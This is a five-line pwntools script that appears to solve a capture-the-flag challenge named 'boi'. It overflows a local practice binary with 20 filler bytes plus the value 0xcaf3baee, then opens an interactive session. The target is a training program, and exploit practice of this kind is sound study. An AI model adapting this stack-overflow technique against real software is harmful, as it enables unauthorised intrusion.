from pwn import *
target = process("./boi")
payload = b"a"*20 + p64(0xcaf3baee)
target.sendline(payload)
target.interactive()